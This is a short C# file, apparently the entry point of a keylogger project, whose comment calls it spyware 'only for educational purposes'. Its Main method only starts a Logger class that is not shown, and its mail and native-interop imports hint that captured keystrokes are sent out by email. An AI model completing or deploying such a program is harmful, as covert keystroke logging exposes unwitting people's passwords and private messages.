using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

// attention spyware program, only for educational purposes
namespace KeyLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            Logger logger = new Logger();
            logger.Start();
        }
    }
}